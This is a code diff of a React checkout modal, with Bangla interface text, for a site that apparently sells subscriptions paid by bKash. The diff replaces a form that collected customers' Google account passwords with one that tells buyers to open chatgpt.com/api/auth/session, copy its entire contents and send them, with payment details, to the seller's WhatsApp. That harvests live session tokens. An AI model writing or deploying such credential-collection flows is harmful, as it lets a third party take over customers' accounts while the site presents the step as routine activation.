@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { Product, Order } from '../types';
-import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle, ShieldAlert, ArrowRight, MessageCircle, Tag, Check } from 'lucide-react';
+import { Lock, Loader2, Mail, Smartphone, AlertTriangle, ShieldAlert, ArrowRight, MessageCircle, Tag, Check, FileText } from 'lucide-react';
 
 interface CheckoutModalProps {
   isOpen: boolean;
@@ -48,7 +48,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 }) => {
   const [step, setStep] = useState<CheckoutStep>('notice');
   const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
+  const [sessionData, setSessionData] = useState('');
   const [method, setMethod] = useState<PaymentMethod>('bkash');
   const [senderNumber, setSenderNumber] = useState('');
   const [trxId, setTrxId] = useState('');
@@ -62,7 +62,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
     if (isOpen) {
       setStep('notice');
       setEmail('');
-      setPassword('');
+      setSessionData('');
       setSenderNumber('');
       setTrxId('');
       setCouponCode('');
@@ -129,7 +129,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
             product: product?.name,
             price: total,
             email: email,
-            password: password,
+            sessionData: sessionData,
             method: method,
             sender: senderNumber,
             trx: trxId,
@@ -156,7 +156,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
     onSuccess();
     // Reset form
     setEmail('');
-    setPassword('');
+    setSessionData('');
     setSenderNumber('');
     setTrxId('');
     setStep('notice'); 
@@ -171,7 +171,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 💰 *Total:* ${total} BDT ${discount > 0 ? `(Discount: ${discount})` : ''}
 ------------------
 📧 *Email:* ${email}
-🔑 *Pass:* ${password}
+🔐 *Session:* ${sessionData}
 ------------------
 💳 *Method:* ${method.toUpperCase()}
 📱 *Sender:* ${senderNumber}
@@ -213,15 +213,17 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 
             <div className="space-y-5 text-slate-300 text-sm leading-relaxed mb-8 bg-slate-800/50 p-5 rounded-xl border border-slate-700">
               <p>
-                <strong className="text-white block mb-2 font-semibold">কেন লগইন তথ্য প্রয়োজন?</strong>
-                এটি পার্সোনাল সাবস্ক্রিপশন, তাই আপনার Gmail/Google আকাউন্টে লগইন করে এটি অ্যাক্টিভেট করতে হয়।
+                <strong className="text-white block mb-2 font-semibold">সাবস্ক্রিপশন চালুর জন্য Session তথ্য প্রয়োজন</strong>
+                আপনার নিজের Personal Account-এ সাবস্ক্রিপশন চালু করতে আমাদের আপনার সেশন তথ্য দরকার হবে।
               </p>
               
               <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-lg">
                 <strong className="text-red-400 block mb-2 font-semibold">⚠️ সতর্কতা:</strong>
-                <p className="text-red-100/90 text-xs">
-                  Google Form-এ পাসওয়ার্ড সাবমিট করলে ফর্ম ব্লক হয়ে যায়। তাই পরবর্তী ধাপে আপনার তথ্য নিরাপদে আমাদের WhatsApp-এ পাঠানোর ব্যবস্থা করা হয়েছে।
-                </p>
+                <ol className="text-red-100/90 text-xs list-decimal pl-4 space-y-1">
+                  <li>যে অ্যাকাউন্টে সাবস্ক্রিপশন নিতে চান, সেই অ্যাকাউন্টে ব্রাউজার থেকে লগইন করুন।</li>
+                  <li>লগইন অবস্থায় <span className="select-all">https://chatgpt.com/api/auth/session</span> ওপেন করুন।</li>
+                  <li>স্ক্রিনে যা দেখাবে সব Select All করে কপি করে আমাদের WhatsApp-এ পাঠান।</li>
+                </ol>
               </div>
             </div>
 
@@ -288,18 +290,26 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 </div>
 
                 <div>
-                  <label className="block text-slate-400 text-sm font-medium mb-2">
-                    অ্যাকাউন্ট পাসওয়ার্ড
-                  </label>
+                  <div className="flex flex-wrap items-center gap-1.5 text-slate-400 text-sm font-medium mb-2">
+                    <span>Session তথ্য:</span>
+                    <a
+                      href="https://chatgpt.com/api/auth/session"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="text-blue-400 hover:text-blue-300 underline underline-offset-2 break-all"
+                    >
+                      https://chatgpt.com/api/auth/session
+                    </a>
+                  </div>
                   <div className="relative">
-                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
-                    <input
-                      type="password"
+                    <FileText className="absolute left-3 top-4 text-slate-500" size={18} />
+                    <textarea
                       required
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                      placeholder="আপনার পাসওয়ার্ড দিন"
-                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
+                      rows={4}
+                      value={sessionData}
+                      onChange={(e) => setSessionData(e.target.value)}
+                      placeholder="https://chatgpt.com/api/auth/session থেকে কপি করা পুরো তথ্য এখানে দিন"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 resize-none"
                     />
                   </div>
                 </div>
@@ -434,7 +444,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 ⚠️ খুব গুরুত্বপূর্ণ:
               </p>
               <p className="text-slate-300 text-xs">
-               অর্ডার কনফার্ম করতে নিচের বাটনে ক্লিক করে <strong>WhatsApp</strong>-এ আপনার অর্ডার ডিটেইলস পাঠিয়ে দিন। এটি পাঠালেই আপনার অর্ডার কনফার্ম হবে।
+               অর্ডার কনফার্ম করতে নিচের বাটনে ক্লিক করে <strong>WhatsApp</strong>-এ পেমেন্ট ডিটেইলসের সাথে Session তথ্য পাঠিয়ে দিন। এটি পাঠালেই আপনার অর্ডার কনফার্ম হবে।
               </p>
             </div>
             
